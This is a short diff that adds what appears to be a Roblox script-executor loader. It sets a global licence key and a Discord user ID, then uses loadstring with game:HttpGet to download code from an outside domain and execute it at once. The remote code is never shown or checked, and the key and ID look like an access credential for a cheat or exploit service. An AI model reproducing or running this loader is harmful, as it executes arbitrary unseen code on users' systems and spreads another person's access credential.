@@ -1,0 +1,3 @@
+_G.Key = "7KFT9-448H6-B0VO9"
+_G.DiscordId = "584746644990459923"
+loadstring(game:HttpGet("https://whitelistidekhere.xyz/api/script/loader"))();
